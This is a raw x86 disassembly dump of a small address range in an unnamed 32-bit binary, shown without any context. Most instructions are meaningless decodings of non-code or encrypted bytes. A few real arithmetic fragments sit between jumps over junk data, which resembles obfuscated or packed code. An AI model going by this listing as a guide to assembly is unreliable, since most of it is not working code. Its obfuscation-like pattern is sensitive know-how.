  409061:	mov    esi,0xbc2f35ab
  409066:	mov    ebp,0x1beee897
  40906b:	mov    ch,0xae
  40906d:	push   ds
  40906e:	mov    bl,0x8f
  409070:	jg     0x409095
  409072:	aaa    
  409073:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409074:	inc    ebp
  409075:	mov    eax,ds:0x2cfb2565
  40907a:	clc    
  40907b:	push   cs
  40907c:	mov    edi,0xfdac64d4
  409081:	xlat   BYTE PTR ds:[ebx]
  409082:	add    BYTE PTR [edi-0x1f],dl
  409085:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409086:	shl    DWORD PTR [esi+0x28b66f01],0x77
  40908d:	loope  0x4090ce
  40908f:	outs   dx,BYTE PTR ds:[esi]
  409090:	sub    al,0x3c
  409092:	scas   eax,DWORD PTR es:[edi]
  409093:	je     0x4090df
  409095:	scas   eax,DWORD PTR es:[edi]
  409096:	in     eax,dx
  409097:	jg     0x4090df
  409099:	xor    ah,BYTE PTR [edi+0x72448500]
  40909f:	or     DWORD PTR [edx],esi
  4090a1:	fisttp DWORD PTR [edi]
  4090a3:	jp     0x4090e2
  4090a5:	inc    edi
  4090a6:	adc    BYTE PTR [esi-0x36],ah
  4090a9:	test   DWORD PTR [ecx+0x58],eax
  4090ac:	lds    esi,FWORD PTR [edi+0x4a]
  4090af:	or     esp,ebp
  4090b1:	pop    es
  4090b2:	aam    0xbc
  4090b4:	mov    bh,0xc8
  4090b6:	retf   
  4090b7:	xchg   esp,eax
  4090b8:	mov    ds:0x5dddd22c,eax
  4090bd:	mov    edi,0x9b0b6c1d
  4090c2:	and    al,0xcc
  4090c4:	repnz pop ds
  4090c6:	jle    0x4090db
  4090c8:	dec    ecx
  4090c9:	dec    ebx
  4090ca:	jecxz  0x409123
  4090cc:	cdq    
  4090cd:	push   es
  4090ce:	repz repnz push 0x5c7f03b
  4090d5:	add    DWORD PTR [eax+0x7b750042],ebp
  4090db:	add    BYTE PTR [eax],al
  4090dd:	jne    0x4093c9
  4090e3:	jmp    0x4093a9
  4090e8:	retf   0xd0cb
  4090eb:	cmp    eax,0xcbd9d1d5
  4090f0:	mov    edx,0xc2a4c6c4
  4090f5:	sar    ebp,1
  4090f7:	push   esp
  4090f8:	mov    gs,edi
  4090fa:	js     0x409174
  4090fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090fd:	jle    0x409177
  4090ff:	js     0x4090dd
  409101:	test   BYTE PTR [ecx-0x30b720de],0x5f
  409108:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409109:	jge    0x40910d
  40910b:	ffreep st(1)
  40910d:	not    dh
  40910f:	shr    eax,cl
  409111:	ret    
  409112:	mov    bl,0xb9
  409114:	cmp    al,0x98
  409116:	inc    edx
  409117:	mov    WORD PTR [esi],?
  409119:	mov    bl,0xf5
  40911b:	adc    esi,DWORD PTR [ebp+0x71]
  40911e:	das    
  40911f:	fcom   DWORD PTR [ecx]
  409121:	pop    edx
  409122:	mov    ds:0xda6177f3,al
  409127:	xor    ecx,DWORD PTR [edi]
  409129:	jp     0x409106
  40912b:	fbstp  TBYTE PTR [ecx+0x1305b9f8]
  409131:	or     al,0xce
  409133:	push   esp
  409134:	pop    eax
  409135:	add    bl,0xba
  409138:	icebp  
  409139:	jge    0x40918a
  40913b:	adc    esp,DWORD PTR [ebx+0x28]
  40913e:	fild   WORD PTR [esi+0x5d]
  409141:	fist   DWORD PTR [edi+0xb]
  409144:	xor    eax,esp
  409146:	jmp    0x409199
  409148:	int    0xa0
  40914a:	mov    al,0x5f
  40914c:	push   0x3b7cdc33
  409151:	mov    ecx,0xef108fb4
  409156:	mov    ds:0x59c505fd,al
  40915b:	xlat   BYTE PTR ds:[ebx]
  40915c:	jmp    0x409113
  40915e:	mov    ecx,0x2be0c548
  409163:	or     ebp,eax
  409165:	pop    es
  409166:	lods   al,BYTE PTR ds:[esi]
  409167:	adc    BYTE PTR [ebp+0x54],ah
  40916a:	xchg   esp,eax
  40916b:	fisttp QWORD PTR [ebp+0x3]
  40916e:	inc    esi
  40916f:	cmp    bl,BYTE PTR [ecx+0x69]
  409172:	mov    edi,0xa392024
  409177:	mov    ebx,0x34384dd7
  40917c:	mov    esp,0xeeae27b5
  409181:	adc    al,0x93
  409183:	and    edi,DWORD PTR [ecx]
  409185:	lock or bl,dh
  409188:	arpl   WORD PTR [esi+0xe7b7173],cx
  40918e:	(bad)  
  40918f:	imul   esi,DWORD PTR [edx],0x21
  409192:	fsub   DWORD PTR [eax-0x75]
  409195:	call   0x4563:0xf5bbc57b
  40919c:	fcmovb st,st(4)
  40919e:	cmp    eax,0xef538991
  4091a3:	add    BYTE PTR [esi],dh
  4091a5:	mov    bh,0xdb
  4091a7:	adc    dh,BYTE PTR [edx-0x1]
  4091aa:	shr    DWORD PTR [eax+0x2a],1
  4091ad:	retf   0x90c9
  4091b0:	ins    BYTE PTR es:[edi],dx
  4091b1:	adc    DWORD PTR [edx-0x441c6cde],edi
  4091b7:	jo     0x40914e
  4091b9:	adc    ebx,edx
  4091bb:	jl     0x4091da
  4091bd:	loope  0x409202
  4091bf:	rep fs stos BYTE PTR es:[edi],al
  4091c2:	lods   eax,DWORD PTR ds:[esi]
  4091c3:	stos   BYTE PTR es:[edi],al
  4091c4:	pop    esp
  4091c5:	sub    al,0xfa
  4091c7:	(bad)
  4091ca:	in     al,dx
  4091cb:	push   ds
  4091cc:	mov    BYTE PTR [ebp+0x41],0x37
  4091d0:	jmp    0xacb:0xfb667137
  4091d7:	pop    esi
  4091d8:	repnz rcl BYTE PTR [esi],1
  4091db:	(bad)  
  4091dd:	push   cs
  4091de:	mov    eax,0x8fb544d6
  4091e3:	xor    eax,0xe477564c
  4091e8:	push   edi
  4091e9:	enter  0xac36,0x71
  4091ed:	inc    ebx
  4091ee:	mov    esi,0xdf1b99c2
  4091f3:	and    BYTE PTR [ebp+0x19],dl
  4091f6:	lea    esi,[edx-0x219ac6c6]
  4091fc:	lods   al,BYTE PTR ds:[esi]
  4091fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091fe:	je     0x40918f
  409200:	(bad)  
  409201:	(bad)  
  409202:	aad    0x1b
  409204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409205:	in     eax,0xc4
  409207:	daa    
  409208:	jo     0x4091b0
  40920a:	sbb    ah,BYTE PTR [edi+ecx*4+0x58]
  40920e:	and    DWORD PTR [ebp-0xa],esi
  409211:	push   ds
  409212:	loope  0x40927d
  409214:	push   0xa62591fc
  409219:	pusha  
  40921a:	adc    ebx,edx
  40921c:	sub    edx,eax
  40921e:	jbe    0x409238
  409220:	cmp    ebp,DWORD PTR [esi+0x44]
  409223:	jge    0x40922e
  409225:	xchg   edx,eax
  409226:	xlat   BYTE PTR ds:[ebx]
  409227:	fmul   QWORD PTR [ebx+eax*2-0x39]
  40922b:	add    dh,0x21
  40922e:	and    bh,BYTE PTR [eax+0x2d]
  409231:	xchg   ebx,eax
  409232:	mov    ah,0x7b
  409234:	rcr    BYTE PTR ds:0x5a77d3ec,1
  40923a:	fsubp  st(2),st
  40923c:	add    DWORD PTR [ebx+0x641eec9b],0xffffff90
  409243:	and    BYTE PTR [edi],al
  409245:	rcr    BYTE PTR [esi+0x267d1527],0x87
  40924c:	(bad)  
  40924d:	mov    DWORD PTR [ebp+0x14],edi
  409250:	xchg   edi,eax
  409251:	or     bl,BYTE PTR [ebx+0x44]
  409254:	ficomp WORD PTR [esi]
  409256:	rol    DWORD PTR [edx-0x3b],cl
  409259:	pop    ecx
  40925a:	pop    esp
  40925b:	pop    ebp
  40925c:	imul   ebp,DWORD PTR [edi],0xc03f603a
  409262:	push   ecx
  409263:	(bad)  
  409264:	mov    dh,0x16
  409266:	jnp    0x409250
  409268:	outs   dx,DWORD PTR ds:[esi]
  409269:	mov    eax,ds:0xd3b3d4a0
  40926e:	(bad)  
  40926f:	mov    ah,0xc5
  409271:	sub    eax,0x5b3b5ce7
  409276:	ins    BYTE PTR es:[edi],dx
  409277:	fist   WORD PTR [ebx+ecx*8-0x243b399]
  40927e:	cmp    DWORD PTR [esi-0x2d50761e],ebp
  409284:	inc    ebp
  409285:	mov    DWORD PTR [ebx],ebp
  409287:	outs   dx,DWORD PTR ds:[esi]
  409288:	es add eax,0xc4c26443
  40928e:	jmp    0x4092cc
  409290:	bound  edi,QWORD PTR [ebx-0xa]
  409293:	mov    edi,?
  409295:	and    BYTE PTR [ebx+eax*2-0x424e252b],0xab
  40929d:	push   edx
  40929e:	call   0x87d02496
  4092a3:	fwait
  4092a4:	cdq    
  4092a5:	mov    al,ds:0x6b13e7f5
  4092aa:	mov    esi,0x97c2022b
  4092af:	fcomp  DWORD PTR [esi-0x64]
  4092b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092b3:	mov    al,ds:0x15183c5e
  4092b8:	idiv   DWORD PTR [ecx-0x2a3bb538]
  4092be:	mov    WORD PTR [esi-0x36],fs
  4092c1:	stc    
  4092c2:	or     eax,0x7ec0f313
  4092c7:	sbb    eax,0x1e7a22e
  4092cc:	xchg   edi,eax
  4092cd:	xor    esi,esi
  4092cf:	mov    ah,0x7
  4092d1:	or     dl,bh
  4092d3:	and    DWORD PTR [esi+ecx*4],esi
  4092d6:	(bad)  
  4092d7:	add    ebx,DWORD PTR [ebp-0x16c5843f]
  4092dd:	aaa    
  4092de:	jns    0x409297
  4092e0:	inc    ebx
  4092e1:	mov    edi,0x22af540a
  4092e6:	aam    0xfc
  4092e8:	neg    DWORD PTR [esp+ebp*2+0x12]
  4092ec:	or     al,0xd
  4092ee:	mov    eax,0xf9b6ebe8
  4092f3:	lods   al,BYTE PTR ds:[esi]
  4092f4:	jg     0x4092f0
  4092f6:	xchg   ebx,eax
  4092f7:	pop    ss
  4092f8:	sti    
  4092f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092fa:	out    0x75,al
  4092fc:	addr16 xchg edx,eax
  4092fe:	inc    edi
  4092ff:	repnz dec esp
  409301:	cwde   
  409302:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409303:	sub    ebx,DWORD PTR [edi]
  409305:	sbb    al,0xc7
  409307:	iret   
  409308:	mov    ds:0xce2e7973,al
  40930d:	dec    esi
  40930e:	fcomp  QWORD PTR [ecx-0x3f6c08fd]
  409314:	sbb    BYTE PTR [esi-0x5d],bh
  409317:	and    al,0xf1
  409319:	cld    
  40931a:	int    0xf1
  40931c:	cmc    
  40931d:	addr16 addr16 adc ebx,esi
  409321:	mov    bh,0x59
  409323:	popf   
  409324:	ds mov ebx,0x3b8961f
  40932a:	cmc    
  40932b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40932c:	xor    BYTE PTR [ebx+0x6b],dl
  40932f:	mov    ecx,esi
  409331:	leave  
  409332:	mov    edx,0x5bb5f63c
  409337:	idiv   eax
  409339:	scas   eax,DWORD PTR es:[edi]
  40933a:	push   0xffffffd9
  40933c:	outs   dx,DWORD PTR ds:[esi]
  40933d:	jae    0x409302
  40933f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409340:	loope  0x409361
  409342:	aaa    
  409343:	xor    esi,DWORD PTR [ebp+0x7b0a57fd]
  409349:	ins    BYTE PTR es:[edi],dx
  40934a:	xor    eax,0xe4951f9d
  40934f:	in     al,0x8b
  409351:	bswap  edi
  409353:	mulps  xmm3,XMMWORD PTR [esp+eiz*2+0x69]
  409358:	xor    al,0xdc
  40935a:	xlat   BYTE PTR ds:[ebx]
  40935b:	dec    eax
  40935c:	mov    WORD PTR [esi-0x3df2d890],fs
  409362:	int    0xc0
  409364:	add    BYTE PTR [eax+0x54],0x2f
  409368:	adc    BYTE PTR [edx+0x1e],ch
  40936b:	sub    al,0x2c
  40936d:	xor    DWORD PTR [ecx-0x30],esi
  409370:	push   es
  409371:	loop   0x40934a
  409373:	pop    ss
  409374:	and    BYTE PTR [edx+edx*1+0x3e],0x5c
  409379:	retf   
  40937a:	or     DWORD PTR [eax-0x1f],edi
  40937d:	mov    bl,bh
  40937f:	add    BYTE PTR [ebp-0x6b9cf020],ah
  409385:	ins    DWORD PTR es:[edi],dx
  409386:	std    
  409387:	push   ds
  409388:	aad    0xa7
  40938a:	mov    ah,0x8e
  40938c:	pop    ebp
  40938d:	test   al,0x31
  40938f:	in     al,0x5f
  409391:	mov    ch,dh
  409393:	pop    ebp
  409394:	aas    
  409395:	out    dx,al
  409396:	xchg   edi,eax
  409397:	in     eax,dx
  409398:	push   eax
  409399:	shl    ebx,cl
  40939b:	jno    0x409375
  40939d:	jo     0x4093d1
  40939f:	inc    ebx
  4093a0:	retf   0xcdb7
  4093a3:	retf   0xb05
  4093a6:	nop
  4093a7:	push   0xfc458b0c
  4093ac:	add    DWORD PTR ds:0x42a7b9,0x42a769
  4093b6:	mov    esi,DWORD PTR [ebp-0x8]
  4093b9:	xor    eax,edx
  4093bb:	xor    esi,edx
  4093bd:	add    eax,ecx
  4093bf:	add    esi,ecx
  4093c1:	imul   eax,esi
  4093c4:	jmp    0x4096ca
  4093c9:	mov    eax,DWORD PTR [ebp+0xc]
  4093cc:	mov    eax,DWORD PTR [eax+0x78]
  4093cf:	mov    DWORD PTR [ebp+0xc],eax
  4093d2:	mov    eax,DWORD PTR [ebp-0x4]
  4093d5:	mov    esi,DWORD PTR [ebp-0x8]
  4093d8:	xor    eax,edx
  4093da:	xor    esi,edx
  4093dc:	add    eax,ecx
  4093de:	add    esi,ecx
  4093e0:	imul   eax,esi
  4093e3:	mov    esi,DWORD PTR [ebp+0xc]
  4093e6:	cmp    esi,eax
  4093e8:	jmp    0x4096ae
  4093ed:	xlat   BYTE PTR ds:[ebx]
  4093ee:	leave  
  4093ef:	retf   0xdad6
  4093f2:	aad    0xdb
  4093f4:	leave  
  4093f5:	adc    bl,BYTE PTR ds:0xea41ff3d
  4093fb:	or     cl,BYTE PTR [edi]
  4093fd:	xor    eax,0xa77878ec
  409402:	jle    0x40947c
  409404:	js     0x4093cb
  409406:	nop
  409407:	pop    es
  409408:	(bad)  
  409409:	fiadd  DWORD PTR [edx]
  40940b:	stc    
  40940c:	addr16 out dx,eax
  40940e:	jl     0x40939c
  409410:	push   cs
  409411:	inc    ebx
  409412:	or     edx,edx
  409414:	adc    ah,ah
  409416:	std    
  409417:	inc    ecx
  409418:	(bad)  
  409419:	loop   0x4093eb
  40941b:	das    
  40941c:	jge    0x409483
  40941e:	xchg   edi,eax
  40941f:	fiadd  WORD PTR [edi]
  409421:	push   0x88996e29
  409426:	add    al,cl
  409428:	pop    ebx
  409429:	fldenv [edx+0x48]
  40942c:	retf   
  40942d:	fsubr  QWORD PTR [edi]
  40942f:	fld    QWORD PTR ds:0x69f27101
  409435:	pusha  
  409436:	scas   al,BYTE PTR es:[edi]
  409437:	dec    ebp
  409438:	mov    edi,0xdb045738
  40943d:	xor    bl,BYTE PTR [edi]
  40943f:	shl    BYTE PTR [edi-0x6ad56f5e],cl
  409445:	stc    
  409446:	or     BYTE PTR [ebp+edi*8+0x1b9956de],dh
  40944d:	jns    0x409497
  40944f:	push   esi
  409450:	sub    eax,0xb7b9ae18
  409455:	fwait
  409456:	or     al,0xc6
  409458:	cmc    
  409459:	cs daa 
  40945b:	xchg   DWORD PTR [eax+0x11137cfc],ebp
  409461:	add    esi,DWORD PTR [edi]
  409463:	mov    dl,0xb9
  409465:	mov    eax,0xc9401d6d
  40946a:	pop    ecx
  40946b:	dec    esi
  40946c:	mov    ah,0x83
  40946e:	mov    dh,0xc5
  409470:	cld    
  409471:	stc    
  409472:	add    al,0xa
  409474:	in     al,dx
  409475:	mov    cl,0x61
  409477:	int3   
  409478:	adc    DWORD PTR [esi],edx
  40947a:	out    dx,eax
  40947b:	jecxz  0x409401
  40947d:	(bad)  
  40947e:	pop    edi
  40947f:	jbe    0x409410
  409481:	dec    ebp
  409482:	aaa    
  409483:	jmp    0x4094bf
  409485:	push   0x34
  409487:	push   edx
  409488:	xor    bl,BYTE PTR [eax+0x4d4e838f]
  40948e:	sub    esi,edi
  409490:	call   0x3e4c:0x21dcf2c5
  409497:	or     eax,0xfbbe91c6
  40949c:	stos   DWORD PTR es:[edi],eax
  40949d:	inc    esi
  40949e:	test   dh,al
  4094a0:	push   0xc98169a4
  4094a5:	shl    dh,cl
  4094a7:	popf   
  4094a8:	cmp    eax,0xd9e57486
  4094ad:	inc    ebx
  4094ae:	add    eax,0x2e535363
  4094b3:	mov    ebx,0xf9c25198
  4094b8:	enter  0xecae,0xe2
  4094bc:	xchg   esp,eax
  4094bd:	sti    
  4094be:	jns    0x40947b
  4094c0:	inc    edi
  4094c1:	hlt    
  4094c2:	imul   ebp,edx,0xffffffb9
  4094c5:	aad    0xb6
  4094c7:	fucomip st,st(0)
  4094c9:	push   ecx
  4094ca:	loop   0x4094b5
  4094cc:	leave  
  4094cd:	ins    BYTE PTR es:[edi],dx
  4094ce:	addr16 dec edx
  4094d0:	or     edi,esi
  4094d2:	dec    esp
  4094d3:	lods   al,BYTE PTR ds:[esi]
  4094d4:	adc    DWORD PTR [ecx+0x7843c566],esp
  4094da:	les    ecx,FWORD PTR [eax]
  4094dc:	xor    al,0xbf
  4094de:	sar    DWORD PTR [edi],cl
  4094e0:	sbb    al,0x85
  4094e2:	push   ecx
  4094e3:	stos   DWORD PTR es:[edi],eax
  4094e4:	add    eax,DWORD PTR [ebp+0x65]
  4094e7:	inc    edi
  4094e8:	adc    bh,BYTE PTR [edi-0x34]
  4094eb:	call   0x8ff5e8c6
  4094f0:	js     0x4094db
  4094f2:	popf   
  4094f3:	mov    ss,WORD PTR [edi]
  4094f5:	jmp    0xbdac:0xb463caae
  4094fc:	cs push ecx
  4094fe:	push   ss
  4094ff:	xchg   BYTE PTR [edi-0x7f],dh
  409502:	imul   esi,esp,0xffffff81
  409505:	xor    eax,0x5ce59473
  40950a:	or     BYTE PTR [ebp+0x47],ah
  40950d:	daa    
  40950e:	mov    BYTE PTR [edi],0x6b
  409511:	dec    eax
  409512:	imul   eax,DWORD PTR [ecx],0x54
  409515:	int    0x25
  409517:	(bad)  
  409519:	jne    0x4094f4
  40951b:	sbb    cl,dh
  40951d:	pop    edx
  40951e:	fmul   QWORD PTR [edx]
  409520:	ret    
  409521:	aad    0xd5
  409523:	fist   WORD PTR ss:[ebp-0x18]
  409527:	fsubr  QWORD PTR [eax+0xc9de2ae]
  40952d:	psllq  mm3,QWORD PTR [esi+0x4a78b905]
  409534:	test   DWORD PTR [esi+0x2752a349],edi
  40953a:	popf   
  40953b:	icebp  
  40953c:	rcl    BYTE PTR [ebx-0x43638b2e],0x2c
  409543:	shl    BYTE PTR [esi+eax*8+0x6],cl
  409547:	stos   BYTE PTR es:[edi],al
  409548:	pop    edi
  409549:	mov    edi,0xfd208c52
  40954e:	pushf  
  40954f:	pop    edi
  409550:	rcl    DWORD PTR [eax-0x205dc922],0x19
  409557:	bound  esi,QWORD PTR [edi]
  409559:	sbb    esi,esp
  40955b:	xor    esp,DWORD PTR [edx-0x77]
  40955e:	adc    eax,0xa918e8e5
  409563:	sbb    edx,DWORD PTR [ebx]
  409565:	cmp    al,al
  409567:	repnz xor esp,esp
  40956a:	pop    es
  40956b:	jmp    FWORD PTR [ebx-0x22a6f2db]
  409571:	sub    ebp,eax
  409573:	adc    al,0x5f
  409575:	out    dx,al
  409576:	inc    esi
  409577:	shl    DWORD PTR [esi-0xe],cl
  40957a:	mul    ebx
  40957c:	push   ds
  40957d:	xchg   ebx,eax
  40957e:	adc    al,cl
  409580:	lods   eax,DWORD PTR ds:[esi]
  409581:	call   0xf2eb0446
  409586:	sbb    al,0xba
  409588:	xor    eax,0xabdcd8ac
  40958d:	xor    dl,BYTE PTR [ebx-0x2bdbd80b]
  409593:	aas    
  409594:	sbb    BYTE PTR [ecx+eax*4+0x70],ch
  409598:	mov    dh,0xd3
  40959a:	(bad)  
  40959b:	std    
  40959c:	dec    ebp
  40959d:	repnz or ch,ah
  4095a0:	js     0x409618
  4095a2:	addr16 data16 gs jmp 0x40956f
  4095a7:	or     bl,BYTE PTR [edx]
  4095a9:	and    eax,DWORD PTR [edi]
  4095ab:	inc    edi
  4095ac:	xchg   esi,eax
  4095ad:	dec    edi
  4095ae:	test   BYTE PTR [eax],bl
  4095b0:	aam    0xb8
  4095b2:	arpl   WORD PTR [edx-0x10],ax
  4095b5:	(bad)  
  4095b6:	std    
  4095b7:	adc    ah,BYTE PTR [esi-0x2b]
  4095ba:	sbb    eax,0x5565fd1c
  4095bf:	push   es
  4095c0:	iret   
  4095c1:	nop
  4095c2:	push   esp
  4095c3:	fiadd  DWORD PTR [eax+eiz*1]
  4095c6:	ret    0xb5f3
  4095c9:	popf   
  4095ca:	retf   0xaa51
  4095cd:	and    DWORD PTR [ebx],edx
  4095cf:	pop    edi
  4095d0:	ja     0x409641
  4095d2:	xor    eax,0x590473db
  4095d7:	hlt    
  4095d8:	addr16 xchg esp,eax
  4095da:	adc    DWORD PTR [esi],eax
  4095dc:	pusha  
  4095dd:	mov    esi,0x50bb113
  4095e2:	mov    bh,0xde
  4095e4:	mov    ds:0x7b697535,al
  4095e9:	push   ss
  4095ea:	test   al,0xfa
  4095ec:	sub    BYTE PTR [ecx+ebp*8],0xc7
  4095f0:	scas   eax,DWORD PTR es:[edi]
  4095f1:	or     ebp,ecx
  4095f3:	cmp    ah,BYTE PTR [eax+0x5b]
  4095f6:	ja     0x40964e
  4095f8:	pushf  
  4095f9:	dec    ecx
  4095fa:	inc    edi
  4095fb:	add    al,0x39
  4095fd:	out    0x10,eax
  4095ff:	mov    ecx,0x775cbce3
  409604:	enter  0x4f1f,0x66
  409608:	and    al,0xe7
  40960a:	inc    esp
  40960b:	xchg   esi,eax
  40960c:	out    0xc0,eax
  40960e:	fs mov eax,0x54e8e833
  409614:	xchg   ebx,eax
  409615:	add    ah,BYTE PTR [eax+0x58]
  409618:	adc    BYTE PTR [esi-0x3ed2cd39],ch
  40961e:	test   al,0x8d
  409620:	xorps  xmm4,XMMWORD PTR [ebx+0x4]
  409624:	ja     0x4095f9
  409626:	pop    ss
  409627:	repz cmp bl,bl
  40962a:	retf   0xaaa7
  40962d:	cmp    eax,0x7440c949
  409632:	dec    edx
  409633:	dec    edx
  409634:	mov    dh,0x15
  409636:	in     eax,dx
  409637:	out    dx,al
  409638:	enter  0xf9b6,0x6a
  40963c:	aaa    
  40963d:	or     esp,DWORD PTR [esi]
  40963f:	imul   esp,DWORD PTR [esi-0x42949a04],0xffffffe9
  409646:	or     BYTE PTR [edx-0x12959084],ch
  40964c:	(bad)
  40964f:	inc    ebp
  409650:	mov    dl,0xfd
  409652:	dec    eax
  409653:	test   eax,0xdef1c84e
  409658:	push   ebp
  409659:	jp     0x4095f1
  40965b:	aad    0x6
  40965d:	mov    eax,0xd2adf0e1
  409662:	arpl   sp,dx
  409664:	in     eax,0xb
  409666:	in     al,dx
  409667:	loope  0x4095f9
  409669:	sahf   
  40966a:	or     eax,0x2ab9b375
  40966f:	adc    al,0x9d
  409671:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409672:	inc    eax
  409673:	push   ss
  409674:	ja     0x409646
  409676:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409677:	sub    esp,DWORD PTR [edi+ecx*8+0x5d]
  40967b:	jecxz  0x4096d3
  40967d:	call   0x6345:0x438fe230
  409684:	je     0x4096fb
  409686:	aam    0xa1
  409688:	std    
  409689:	xchg   esi,eax
  40968a:	cmp    DWORD PTR [ecx-0x2a],0x1b8c927f
  409691:	inc    BYTE PTR fs:[ebp-0x58]
  409695:	add    BYTE PTR [ebp-0xeb2669c],al
  40969b:	pop    ss
  40969c:	imul   esp,DWORD PTR ss:[esi+eax*8],0x15
  4096a1:	rep ins DWORD PTR es:[edi],dx
  4096a3:	cli    
  4096a4:	push   cs
  4096a5:	jge    0x409627
  4096a7:	and    al,0x16
  4096a9:	es dec ecx
  4096ab:	sub    eax,0x458bf8cd
  4096b0:	cld    
  4096b1:	je     0x4093ac
  4096b7:	xor    eax,edx
  4096b9:	add    eax,ecx
  4096bb:	mov    ecx,DWORD PTR [ebp+0xc]
  4096be:	imul   eax,ecx
  4096c1:	add    eax,DWORD PTR [ebp+0x8]
  4096c4:	mov    DWORD PTR [ebp+0xc],eax
  4096c7:	mov    eax,DWORD PTR [ebp+0xc]
  4096ca:	pop    esi
  4096cb:	leave  
  4096cc:	ret    0x8
  4096cf:	push   ebp
  4096d0:	mov    ebp,esp
  4096d2:	jmp    0x4099c5
  4096d7:	leave  
  4096d8:	enter  0x3ed6,0xd9
  4096dc:	(bad)  
  4096dd:	(bad)  
  4096df:	xlat   BYTE PTR ds:[ebx]
  4096e0:	enter  0xc218,0x1f
  4096e4:	leave  
  4096e5:	jno    0x4096c7
  4096e7:	pop    esp
  4096e8:	bnd js 0x409763
  4096eb:	push   edx
  4096ec:	jle    0x409766
  4096ee:	js     0x409724
  4096f0:	dec    ecx
  4096f1:	rol    DWORD PTR [edi+0x4d2fee8e],0xc2
  4096f8:	cmp    eax,0xbc4d3949
  4096fd:	out    dx,eax
  4096fe:	div    BYTE PTR [ecx]
  409700:	cld    
  409701:	pop    eax
  409702:	add    ah,dl
  409704:	pusha  
  409705:	mov    al,BYTE PTR [esi+0x212f01e]
  40970b:	dec    ebp
  40970c:	mov    al,0xef
  40970e:	out    0x50,eax
  409710:	xchg   ecx,eax
  409711:	sti    
  409712:	adc    ch,al
  409714:	jecxz  0x409714
  409716:	scas   eax,DWORD PTR es:[edi]
  409717:	mov    ebx,fs
  409719:	add    cl,bl
  40971b:	shl    DWORD PTR ds:0x5cf50906,cl
  409721:	or     edi,DWORD PTR [eax+ecx*2+0x2b]
  409725:	div    BYTE PTR [edi-0x16]
  409728:	dec    edi
  409729:	aaa    
  40972a:	sub    eax,0xaf3f240c
  40972f:	dec    esp
  409730:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409731:	retf   0x8a9d
  409734:	jmp    0x409778
  409736:	sub    ebx,DWORD PTR [ebp-0x2069ec23]
  40973c:	fisub  DWORD PTR [edx]
  40973e:	ins    DWORD PTR es:[edi],dx
  40973f:	sbb    cl,BYTE PTR [eax-0x5f35f7de]
  409745:	jno    0x4096da
  409747:	pop    esi
  409748:	retf   
  409749:	sub    al,0xfb
  40974b:	stos   DWORD PTR es:[edi],eax
  40974c:	push   eax
  40974d:	lea    esp,[eax+0x65]
  409750:	ins    BYTE PTR es:[edi],dx
  409751:	or     DWORD PTR [ebx+esi*4],eax
  409754:	out    0xe7,al
  409756:	mov    esp,0x25877be6
  40975b:	push   0x56
  40975d:	pop    ecx
  40975e:	pusha  
  40975f:	push   edx
  409760:	and    bh,BYTE PTR [ecx]
  409762:	scas   al,BYTE PTR es:[edi]
  409763:	jbe    0x409764
  409765:	cdq    
  409766:	pusha  
  409767:	and    BYTE PTR [ebx+0x5b],ah
  40976a:	push   esp
  40976b:	inc    ecx
  40976c:	inc    edi
  40976d:	xchg   ebx,eax
  40976e:	sub    eax,0x6ed5e406
  409773:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409774:	mov    esp,0xea0338e3
  409779:	xor    eax,0xafadd106
  40977e:	pop    edi
  40977f:	sbb    DWORD PTR [eax+0x687facad],edi
  409785:	mov    ecx,0x49edaa7b
  40978a:	jp     0x4097dd
  40978c:	repnz (bad) 
  40978e:	enter  0x5872,0xc9
  409792:	in     al,0x76
  409794:	(bad)  
  409795:	ror    BYTE PTR [edi*8-0x6a507d9a],0xda
  40979d:	mov    edi,DWORD PTR [ebx+eax*8-0x72]
  4097a1:	sahf   
  4097a2:	stc    
  4097a3:	xchg   esp,eax
  4097a4:	int3   
  4097a5:	xor    BYTE PTR ds:0x53595771,dh
  4097ab:	add    al,0xc4
  4097ad:	aas    
  4097ae:	iret   
  4097af:	pop    ds
  4097b0:	inc    ecx
  4097b1:	jns    0x4097a4
  4097b3:	push   ds
  4097b4:	jo     0x409787
  4097b6:	pop    eax
  4097b7:	jb     0x409754
  4097b9:	adc    eax,0x462c7a0b
  4097be:	xor    bh,dl
  4097c0:	sar    DWORD PTR [eax+0x21],cl
  4097c3:	add    DWORD PTR [ebp+esi*1+0xa],ebx
  4097c7:	xchg   dl,al
  4097c9:	sub    eax,0xcd0e436f
  4097ce:	jl     0x4097c4
  4097d0:	mov    esp,0x60179152
  4097d5:	pop    eax
  4097d6:	mov    dl,0x9
  4097d8:	inc    edi
  4097d9:	ins    BYTE PTR es:[edi],dx
  4097da:	mov    bl,0x6a
  4097dc:	mov    eax,0x3440a121
  4097e1:	add    eax,0x11ee740
  4097e6:	aas    
  4097e7:	push   ebp
  4097e8:	adc    bh,BYTE PTR [eax-0x23]
  4097eb:	add    BYTE PTR [eax],cl
  4097ed:	jno    0x40978e
  4097ef:	sbb    edi,DWORD PTR [ecx+0x67]
  4097f2:	xor    al,0x1c
  4097f4:	jns    0x409837
  4097f6:	(bad)  
  4097f9:	xchg   ebx,eax
  4097fa:	rol    esi,cl
  4097fc:	fistp  DWORD PTR [edi]
  4097fe:	add    esp,ebp
  409800:	(bad)  
  409801:	mov    eax,ds:0xe32adb77
  409806:	and    BYTE PTR [ebp+0x62],bl
  409809:	cdq    
  40980a:	pop    ecx
  40980b:	mov    esi,0x8c1bc6bb
  409810:	pop    ebx
  409811:	pop    es
  409812:	pop    ebp
  409813:	mov    bh,0x64
  409815:	(bad)  
  409816:	cmp    al,0x9b
  409818:	mov    eax,0xa367fb29
  40981d:	mov    edi,0xdf060bca
  409822:	sar    BYTE PTR [eax-0x2],1
  409825:	test   eax,0xda107985
  40982a:	dec    edi
